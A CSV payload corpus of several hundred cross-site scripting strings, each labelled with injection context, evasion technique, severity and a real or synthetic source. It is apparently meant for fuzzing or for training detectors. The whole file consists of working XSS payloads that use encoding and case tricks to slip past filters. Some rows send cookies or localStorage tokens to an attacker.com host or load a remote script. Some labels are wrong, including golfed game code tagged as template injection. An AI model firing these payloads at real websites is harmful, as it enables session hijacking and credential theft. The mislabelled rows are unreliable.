payload,context,technique,severity,length,source
OncLicK=cOnfIrm/**/(1),event_handler,synthetic,low,22,synthetic
""" on&#101;nd&#101;d=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,69,synthetic
"<rb onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</rb>",tag_injection,none,medium,65,real
<!--><link onwaiting=confirm(1)>,tag_injection,synthetic,medium,32,synthetic
"<wbr onmouseleave=""alert(1)"">AnonKryptiQuz</wbr>",tag_injection,none,medium,48,real
" onFocUs=ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,46,synthetic
<x contenteditable oninput=alert(1)>input here!,tag_injection,none,medium,47,real
"<legend onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</legend>",tag_injection,none,medium,70,real
"<div draggable=""true"" contenteditable>drag me</div><title ondrop=alert(1) contenteditable>drop here</title>",tag_injection,none,medium,107,real
"' on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,89,synthetic
"J&#97;VasCriPt:ConFirM(STriNg.FroMChArCOde(88,83,83))",js_uri,synthetic,high,53,synthetic
<IMG SRC=javascript:alert('XSS')>,js_uri,case_variation,medium,33,real
<script>/x/confirm(location.hash)</script>,script_injection,synthetic,medium,42,synthetic
<body/oninvalid=\u0061lert(location.hash)>,tag_injection,synthetic,low,42,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></p>",tag_injection,none,medium,172,real
<xss onk&#101;ypr&#101;ss=consol&#101;.log(1)>,tag_injection,synthetic,low,46,synthetic
"<marquee onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",tag_injection,none,medium,76,real
%22><img src=x onvolumechange=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,49,synthetic
"java
script:prompt(document.domain)",js_uri,synthetic,medium,35,synthetic
%3C!--%3E%3Cmarquee onpopstate=alert('XSS')%3E,tag_injection,synthetic,medium,46,synthetic
"<style>:target {color:red;}</style><xmp id=x style=""transition:color 1s"" ontransitionstart=alert(1)></xmp>",tag_injection,none,medium,106,real
<maRquEe OnaUxcLicK=pRomPt(LocAtiOn.HasH) OnaUxcLicK=pRomPt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,75,synthetic
"<scr	ipt
ondblclick=prompt(1)>",tag_injection,synthetic,medium,30,synthetic
"""><img src=x onbeforecut=\u0061lert(document.domain)>",attribute_escape,synthetic,low,53,synthetic
onreset=alert(document.domain),event_handler,synthetic,medium,30,synthetic
"\%22 onvolumechange=alert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,58,synthetic
<SCRIPT>alert('AnonKryptiQuz');</SCRIPT>,script_injection,case_variation,medium,40,real
<body onblur=alert(1) id=x><iframe id=x>,tag_injection,none,medium,40,real
%27><img src=x onpagehide=prompt(document.domain)>,attribute_escape,synthetic,medium,50,synthetic
&quOt; onPoiNteRup=prOmpT(lOcaTioN.hAsh) x=&qUot;,attribute_escape,synthetic,medium,49,synthetic
""" onmous&#101;ov&#101;r=consol&#101;.log('XSS') """,attribute_escape,synthetic,low,49,synthetic
<body onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</body>,tag_injection,none,medium,74,real
"<content oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</content>",tag_injection,none,medium,66,real
"\"" OnmOusEdoWn=ConFirM(1)//",attribute_escape,synthetic,medium,27,synthetic
"""><img src=x onmouseenter=\u0061lert(document.domain)>",attribute_escape,synthetic,low,54,synthetic
<%= &#97;l&#101;rt(docum&#101;nt.cooki&#101;) %>,template_injection,synthetic,low,48,synthetic
"""><MetA oNtrAnsItiOnsTarT=aLerT(lOcaTioN.hAsh)>",tag_injection,synthetic,medium,47,synthetic
"document.body.innerHTML=""<img src=x onerror=fetch(location.hash)>""",dom_sink,synthetic,high,66,synthetic
<blInk onPopStaTe=ConSolE.lOg(DocUmeNt.DomAin) oNpoPstAte=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,87,synthetic
"<video><source onerror=""javascript:alert(1)"">//INJECTX",js_uri,none,medium,54,real
"__proto__[""ontouchend""]=fetch(document.cookie)",dom_sink,synthetic,high,46,synthetic
\' OngEstUreEnd=prOmpT(dOcuMenT.dOmaIn)//,attribute_escape,synthetic,medium,41,synthetic
' oNdbLclIck=coNfiRm(1) ',attribute_escape,synthetic,medium,25,synthetic
&quot; onpointerdown=console.log(document.domain) x=&quot;,attribute_escape,synthetic,medium,58,synthetic
"<maTh
OnpLayIng=coNsoLe.Log('XSS')>",tag_injection,synthetic,medium,35,synthetic
"SetTimEouT(""EvaL('XSS')"",0)",dom_sink,synthetic,low,27,synthetic
<img/src=@&#32;&#13; onerror = prompt('&#49;'),tag_injection,html_entity,medium,46,real
<header onpointerover=alert(1) style=display:block>AnonKryptiQuz</header>,tag_injection,none,medium,73,real
	onDblCliCk=ConSolE.lOg(1),event_handler,synthetic,medium,26,synthetic
"<p onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></p>",tag_injection,none,medium,275,real
<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>,tag_injection,none,medium,70,real
'><img src=x oncopy=consol&#101;.log(1)>,attribute_escape,synthetic,low,40,synthetic
\' onp&#97;g&#101;r&#101;v&#101;&#97;l=consol&#101;.log(docum&#101;nt.dom&#97;in)//,attribute_escape,synthetic,low,83,synthetic
"<image2 draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</image2>",tag_injection,none,medium,90,real
"<embed onclick=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",tag_injection,none,medium,67,real
"`><img src=x onpromptdismiss=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,77,synthetic
<article onpointerout=alert(1) style=display:block>AnonKryptiQuz</article>,tag_injection,none,medium,74,real
ondragenter=javascript:prompt(document.domain),event_handler,synthetic,medium,46,synthetic
OntRanSitIonRun=alErt(doCumEnt.doMaiN),event_handler,synthetic,medium,38,synthetic
"<style>@keyframes slidein {}</style><del style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></del>",tag_injection,none,medium,160,real
<// style=x:expression\28javascript:alert(8304)\29>,js_uri,none,medium,51,real
oninput=prompt&#40;'XSS'&#41;,event_handler,synthetic,low,29,synthetic
""" oNplAyiNg=ConFirM(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,high,52,synthetic
""" oNseLecT=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape,synthetic,high,51,synthetic
"<samp oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</samp>",tag_injection,none,medium,60,real
%22><select onvolumechange=console.log(1)>,tag_injection,synthetic,medium,42,synthetic
"__proto__[""ontouchstart""]=fetch(String.fromCharCode(88,83,83))",dom_sink,synthetic,high,62,synthetic
"""><img src=x ontransitionrun=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,72,synthetic
"<svg onload\r\n=$.globalEval(""al""+""ert()"");>",dom_sink,none,low,44,real
%27 onanimationend=console.log(%27XSS%27) %27,attribute_escape,synthetic,medium,45,synthetic
""" ondrop=confirm(1) """,attribute_escape,synthetic,medium,21,synthetic
"__proto__[""onch&#97;ng&#101;""]=prompt(docum&#101;nt.cooki&#101;)",dom_sink,synthetic,medium,64,synthetic
"sg7cx""%20onerror%3d""confirm(document.domain)""gd67e",dom_sink,url_encoding,medium,50,real
"<del oncut=""alert(1)"" contenteditable>AnonKryptiQuz</del>",tag_injection,none,medium,57,real
`><Img srC=x onBluR=aLerT(dOcuMenT.dOmaIn)>,attribute_escape,synthetic,medium,43,synthetic
${prompt(docum&#101;nt.cooki&#101;)|n},template_injection,synthetic,medium,38,synthetic
<main onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,66,real
<set/onwebkitfullscreenchange=console.log('XSS')>,tag_injection,synthetic,medium,49,synthetic
"onpagereveal=\u0061lert/*x*/(String.fromCharCode(88,83,83))",event_handler,synthetic,high,59,synthetic
<script>+-+-1-+-+confirm(1)</script>,script_injection,none,medium,36,real
<a src=x onmozfullscreenchange=\u0061lert(location.hash)>,tag_injection,synthetic,low,57,synthetic
%3Ctemplate src=x onclose=console.log(1)%3E,tag_injection,synthetic,medium,43,synthetic
`><img src=x ontouchend=console.log('XSS')>,attribute_escape,synthetic,medium,43,synthetic
<scRipT x=y OndBlcLicK=pRomPt(1)>,tag_injection,synthetic,medium,33,synthetic
"&lt;SCRIPT a=\""&gt;\"" '' SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",generic,html_entity,low,94,real
\' on&#97;nim&#97;tionc&#97;nc&#101;l=prompt(loc&#97;tion.h&#97;sh)//,attribute_escape,synthetic,medium,69,synthetic
 onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,82,synthetic
"<blink
onpopst&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,low,70,synthetic
<scr	ipt/onclick=prompt('XSS')>,tag_injection,synthetic,medium,31,synthetic
onpaste=javascript:\u0061lert(1),event_handler,synthetic,low,32,synthetic
"__proto__[""ongotpointercapture""]=\u0061lert(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink,synthetic,high,99,synthetic
"<meter onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</meter>",tag_injection,none,medium,63,real
%3Caudio onmouseover=console.log('XSS')/%3E,tag_injection,synthetic,medium,43,synthetic
' ><svg onp&#97;us&#101;=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,59,synthetic
"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></nextid>",tag_injection,none,medium,116,real
""" ><svg ontr&#97;nsition&#101;nd=confirm('XSS')>",attribute_escape,synthetic,medium,48,synthetic
' %3E%3Csvg onpointerover=console.log('XSS')%3E,attribute_escape,synthetic,medium,47,synthetic
"<picture onclick=""alert(1)"">AnonKryptiQuz</picture>",tag_injection,none,medium,51,real
<vid&#101;o src=x onclick=consol&#101;.log('XSS')>,tag_injection,synthetic,low,50,synthetic
${{confirm(1)}},template_injection,synthetic,medium,15,synthetic
<summary onpointerover=alert(1) style=display:block>AnonKryptiQuz</summary>,tag_injection,none,medium,75,real
`><img src=x onsecuritypolicyviolation=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,62,synthetic
%27 ondrop=confirm(1) %27,attribute_escape,synthetic,medium,25,synthetic
"<tt draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</tt>",tag_injection,none,medium,80,real
"<script>/x/confirm(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection,synthetic,medium,67,synthetic
"\' onvolum&#101;ch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,medium,80,synthetic
<video onmozfullscreenchange=prompt('XSS') onmozfullscreenchange=prompt('XSS')>,tag_injection,synthetic,medium,79,synthetic
"<style>:target {transform: rotate(180deg);}</style><a id=x style=""transition:transform 2s"" ontransitionrun=print()></a>",tag_injection,none,low,119,real
"LocAtiOn.HreF=""JavAscRipT:aLerT('XSS')""",dom_sink,synthetic,high,39,synthetic
""" %3E%3Csvg onpause=console.log('XSS')%3E",attribute_escape,synthetic,medium,41,synthetic
{{#with \u0061lert(1)}}...{{/with}},template_injection,synthetic,low,35,synthetic
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=fetch(btoa(document.cookie))>"")",dom_sink,synthetic,high,90,synthetic
<mt&#101;xt x=y onmous&#101;down=consol&#101;.log(1)>,tag_injection,synthetic,low,53,synthetic
eeee<%2fscript><script>prompt(/AnonKryptiQuz/.source)<%2fscript>yyyy,script_injection,url_encoding,medium,68,real
"<data onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</data>",tag_injection,none,medium,67,real
OntRanSitIonRun=coNfiRm(1),event_handler,synthetic,medium,26,synthetic
<form onwaiting=confirm(1)>,tag_injection,synthetic,medium,27,synthetic
onscroll&#101;nd=prompt(1),event_handler,synthetic,medium,26,synthetic
onpoint&#101;rmov&#101;=&#97;l&#101;rt/***/('XSS'),event_handler,synthetic,low,50,synthetic
for(t?c.outerHTmL=o:i=o=’’;i++<1024;o+=`<code onclick=this.innerHTmL=’${M(i)?’*’:n||’·’}’>#</code>${i%64?’’:’<p>’}`)for(n=j=0;j<9;n+=M(i-65+j%3+(j++/3|0)*64))M=i=>i>64&i<960&i%64>1&C(i*i)>.7,template_injection,url_encoding,high,190,real
""" ><svg onpointerdown=\u0061lert(document.domain)>",attribute_escape,synthetic,low,50,synthetic
%22><tr ontouchstart=confirm(location.hash)>,tag_injection,synthetic,medium,44,synthetic
""" %3E%3Csvg onwheel=prompt(location.hash)%3E",attribute_escape,synthetic,medium,44,synthetic
"<style>@keyframes slidein {}</style><style style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></style>",tag_injection,none,medium,170,real
<input4 onpointerdown=alert(1) style=display:block>AnonKryptiQuz</input4>,tag_injection,none,medium,73,real
<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#,script_injection,url_encoding|case_variation,medium,265,real
document.querySelector(%22body%22).innerHTML+=%22XMLHttpRequest(%27XSS%27)%22,dom_sink,synthetic,high,77,synthetic
"<strike onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</strike>",tag_injection,none,medium,88,real
"<style>:target {transform: rotate(180deg);}</style><image3 id=x style=""transition:transform 2s"" ontransitionrun=print()></image3>",tag_injection,none,low,129,real
"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink,synthetic,low,167,synthetic
__proto__[%22onstalled%22]=console.log(document.cookie),dom_sink,synthetic,high,55,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sup>",tag_injection,none,medium,176,real
' ><svG oNpaUse=coNfiRm(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,41,synthetic
 onfocusin=\u0061lert(1),event_handler,synthetic,low,24,synthetic
"document.querySelector(""body"").innerHTML+=""fetch(1)""",dom_sink,synthetic,high,52,synthetic
"<ifr&#97;m&#101; src=x ontouchst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,87,synthetic
"<object onmouseleave=""alert(1)"">AnonKryptiQuz</object>",tag_injection,none,medium,54,real
`><Img srC=x onDraGstArt=coNfiRm(1)>,attribute_escape,synthetic,medium,36,synthetic
`%3E%3Cimg src=x onpointerover=confirm(location.hash)%3E,attribute_escape,synthetic,medium,56,synthetic
<a Src=x OnbEfoRemAtcH=pRomPt(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,47,synthetic
""" ><svg onpointerrawupdate=alert(location.hash)>",attribute_escape,synthetic,medium,48,synthetic
<div src=x onpause=confirm(location.hash)>,tag_injection,synthetic,medium,42,synthetic
<!--><template onsearch=console.log(document.domain)>,tag_injection,synthetic,medium,53,synthetic
<td	onmozfullscreenchange=console.log(location.hash)>,tag_injection,synthetic,medium,53,synthetic
<&#97;udio src=x onpopst&#97;t&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,68,synthetic
%27><img src=x ondblclick=console.log(location.hash)>,attribute_escape,synthetic,medium,53,synthetic
"location.href=""javascript:fetch(1)""",dom_sink,synthetic,high,35,synthetic
'><img src=x onscrollsnapchange=alert('XSS')>,attribute_escape,synthetic,medium,45,synthetic
\%22 onbeforematch=confirm(location.hash)//,attribute_escape,synthetic,medium,43,synthetic
%22><img src=x onmousedown=alert(location.hash)>,attribute_escape,synthetic,medium,48,synthetic
"<title>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</title>",js_uri,comment_injection|url_encoding,medium,159,real
"location=""javascr	ipt:alert(1)""",dom_sink,synthetic,high,31,synthetic
<select	onmousewheel=alert(document.domain)>,tag_injection,synthetic,medium,44,synthetic
%22><img src=x onbeforeinput=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,52,synthetic
">'>""><svg/onload=alert(document.domain)>",dom_sink,none,medium,40,real
<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,tag_injection,none,medium,51,real
"__proto__[""onmous&#101;up""]=prompt(loc&#97;tion.h&#97;sh)",dom_sink,synthetic,medium,57,synthetic
"<style>:target {transform: rotate(180deg);}</style><u id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></u>",tag_injection,none,medium,120,real
<template onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,70,real
<listing/onwebkitanimationend=console.log(%27XSS%27)>,tag_injection,synthetic,medium,53,synthetic
"<tr onTraNsiTioNenD=pRomPt(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection,synthetic,high,59,synthetic
<object	onanimationcancel=alert(document.domain)>,tag_injection,synthetic,medium,49,synthetic
%3Canimatemotion x=y onanimationiteration=console.log('XSS')%3E,tag_injection,synthetic,medium,63,synthetic
%3Cmath ondragover=prompt(1)/%3E,tag_injection,synthetic,medium,32,synthetic
' onerror=console.log(document.domain) ',attribute_escape,synthetic,medium,40,synthetic
"onw&#101;bkittr&#97;nsition&#101;nd=&#97;l&#101;rt/***/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,95,synthetic
"<embed oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</embed>",tag_injection,none,medium,62,real
"document.body.innerHTML=""<img src=x onerror=confirm('XSS')>""",dom_sink,synthetic,high,60,synthetic
%3Ctitle	onstalled=alert('XSS')%3E,tag_injection,synthetic,medium,34,synthetic
onfocusin=javascript:confirm('XSS'),event_handler,synthetic,medium,35,synthetic
""" oNbeForEpaSte=alErt('XSS') """,attribute_escape,synthetic,medium,30,synthetic
<arEa OnlOad=coNsoLe.Log(doCumEnt.doMaiN)/>,tag_injection,synthetic,medium,43,synthetic
<noscript ongesturestart=alert(%27XSS%27) ongesturestart=alert(%27XSS%27)>,tag_injection,synthetic,medium,74,synthetic
 onKeyPreSs=ProMpt(1),event_handler,synthetic,medium,21,synthetic
onc&#97;npl&#97;y=confirm(1),event_handler,synthetic,medium,28,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tfoot id=x style=""position:absolute;"" onanimationcancel=""print()""></tfoot>",tag_injection,none,low,179,real
"<div draggable=""true"" contenteditable>drag me</div><col ondrop=alert(1) contenteditable style=display:block>drop here</col>",tag_injection,none,medium,123,real
"%3Cbody
onbeforecut=confirm(document.domain)%3E",tag_injection,synthetic,medium,47,synthetic
"<style>@keyframes slidein {}</style><object style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></object>",tag_injection,none,medium,172,real
<dialog x=y onpagehide=console.log(1)>,tag_injection,synthetic,medium,38,synthetic
 onpagereveal=confirm(document.domain),event_handler,synthetic,medium,38,synthetic
"<th oncontextmenu=""alert(1)"">AnonKryptiQuz</th>",tag_injection,none,medium,47,real
<head id=x tabindex=1 onbeforeactivate=alert(1)></head>,tag_injection,none,medium,55,real
"""`'><script>\xE2\x80\x83javascript:alert(4045)</script>",script_injection,none,medium,55,real
 onLoaD=aLerT(dOcuMenT.dOmaIn),event_handler,synthetic,medium,30,synthetic
"%3Cset
onend=alert(1)%3E",tag_injection,synthetic,medium,24,synthetic
"<section onmouseleave=""alert(1)"">AnonKryptiQuz</section>",tag_injection,none,medium,56,real
"<dfn onmousedown=""alert(1)"">AnonKryptiQuz</dfn>",tag_injection,none,medium,47,real
"<XSS STYLE=""xss:expression(javascript:alert(1))"">",js_uri,case_variation,medium,49,real
	onrepeat=alert(location.hash),event_handler,synthetic,medium,30,synthetic
' onmouseup=console.log('XSS') ',attribute_escape,synthetic,medium,32,synthetic
`><img src=x onfocusout=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,55,synthetic
<cite onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"""><BODy onbeforescriptexecute=""x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c"">",dom_sink,unicode_escape|case_variation,high,119,real
"\%27 onerror=alert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,51,synthetic
"<xmp onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</xmp>",tag_injection,none,medium,66,real
 onKeyDowN=pRomPt(LocAtiOn.HasH),event_handler,synthetic,medium,32,synthetic
onerror=javascr	ipt:console.log('XSS'),event_handler,synthetic,medium,38,synthetic
' ontransitionrun=console.log('XSS') ',attribute_escape,synthetic,medium,38,synthetic
<dir onpointermove=alert(1) style=display:block>AnonKryptiQuz</dir>,tag_injection,none,medium,67,real
"<video draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</video>",tag_injection,none,medium,68,real
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""&#101;v&#97;l('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)""",dom_sink,synthetic,low,143,synthetic
"\"" onmous&#101;up=consol&#101;.log('XSS')//",attribute_escape,synthetic,low,43,synthetic
onlo&#97;d=prompt&#40;docum&#101;nt.dom&#97;in&#41;,event_handler,synthetic,low,51,synthetic
"<rb onclick=""alert(1)"" style=display:block>AnonKryptiQuz</rb>",tag_injection,none,medium,61,real
`><img src=x ondrop=alert(%27XSS%27)>,attribute_escape,synthetic,medium,37,synthetic
document.write(%22<img src=x onerror=alert(localStorage.getItem(%27token%27))>%22),dom_sink,synthetic,high,82,synthetic
j&#97;v&#97;script:consol&#101;.log/**/(loc&#97;tion.h&#97;sh),js_uri,synthetic,low,62,synthetic
"<div draggable=""true"" contenteditable>drag me</div><address ondrop=alert(1) contenteditable>drop here</address>",tag_injection,none,medium,111,real
"LocAtiOn.HreF=""JavAscRipT:pRomPt(LocAtiOn.HasH)""",dom_sink,synthetic,high,48,synthetic
*/alert(1)</script><script>/*,script_injection,none,medium,29,real
%3Cset x=y onend=alert(1)%3E,tag_injection,synthetic,medium,28,synthetic
"<content onmousemove=""alert(1)"">AnonKryptiQuz</content>",tag_injection,none,medium,55,real
onpl&#97;ying=consol&#101;.log/***/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,58,synthetic
<svg src=x onpromptdismiss=\u0061lert(location.hash)>,tag_injection,synthetic,low,53,synthetic
\' onpointerdown=alert(document.domain)//,attribute_escape,synthetic,medium,41,synthetic
"onb&#101;for&#101;p&#97;st&#101;=&#97;l&#101;rt/***/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,92,synthetic
"<blockquote onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</blockquote>",tag_injection,none,medium,95,real
`><Img srC=x onWebKitAniMatIonEnd=prOmpT(1)>,attribute_escape,synthetic,medium,44,synthetic
<anImaTemOtiOn/OngEstUreStaRt=ConFirM(1)>,tag_injection,synthetic,medium,41,synthetic
%26%2302java%26%23115cript:alert(document.domain),dom_sink,url_encoding,medium,49,real
"<sp&#97;n
ons&#101;curitypolicyviol&#97;tion=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,low,83,synthetic
</scr</script>ipt><ifr<iframeame/onload=prompt()>whs,tag_injection,none,medium,52,real
&quOt; onPagEshOw=ProMpt(doCumEnt.doMaiN) X=&QuoT;,attribute_escape,synthetic,medium,50,synthetic
"""><AniMatE oNpaGesHow=coNsoLe.Log('XSS')>",tag_injection,synthetic,medium,41,synthetic
"`%3E%3Cimg src=x onpointerdown=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,76,synthetic
onfullscr&#101;&#101;nch&#97;ng&#101;=j&#97;v&#97;script:consol&#101;.log(1),event_handler,synthetic,low,76,synthetic
"<u draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</u>",tag_injection,none,medium,55,real
"<frameset onclick=""alert(1)"" style=display:block>AnonKryptiQuz</frameset>",tag_injection,none,medium,73,real
<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>,tag_injection,none,medium,76,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style=""position:absolute;"" onanimationcancel=""print()""></frame>",tag_injection,none,low,179,real
"<slot oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</slot>",tag_injection,none,medium,60,real
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=XMLHttpRequest(%27XSS%27)>%22)",dom_sink,synthetic,high,95,synthetic
""" oNhaShcHanGe=ConSolE.lOg(DocUmeNt.DomAin) """,attribute_escape,synthetic,medium,45,synthetic
"%22><img src=x onpromptaction=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,69,synthetic
\%27 onsearch=alert(1)//,attribute_escape,synthetic,medium,24,synthetic
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationend=""alert(1)""></template>",tag_injection,none,medium,101,real
"<div draggable=""true"" contenteditable>drag me</div><video ondrop=alert(1) contenteditable style=display:block>drop here</video>",tag_injection,none,medium,127,real
"location=""javascript:console.log(localStorage.getItem('token'))""",dom_sink,synthetic,high,64,synthetic
<noscr	ipt src=x onbeforematch=console.log('XSS')>,tag_injection,synthetic,medium,50,synthetic
<SCRIPT onreadystatechange=javascript:javascript:alert(7687);></SCRIPT>,script_injection,case_variation,medium,71,real
document.body.innerHTML=%22<img src=x onerror=prompt(document.cookie+%27&loc=%27+location.href)>%22,dom_sink,synthetic,high,99,synthetic
%27><img src=x ongotpointercapture=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,58,synthetic
<image onend=prompt(1) onend=prompt(1)>,tag_injection,synthetic,medium,39,synthetic
<form src=x onwebkittransitionend=prompt(location.hash)>,tag_injection,synthetic,medium,56,synthetic
"<element onmouseout=""alert(1)"">AnonKryptiQuz</element>",tag_injection,none,medium,54,real
<auDio	onPopStaTe=ConFirM(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
"setTimeout(""\u0061lert(document.domain)"",0)",dom_sink,synthetic,low,43,synthetic
""" ><svg ontr&#97;nsition&#101;nd=&#97;l&#101;rt(1)>",attribute_escape,synthetic,low,51,synthetic
<m&#97;th onmous&#101;up=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,low,69,synthetic
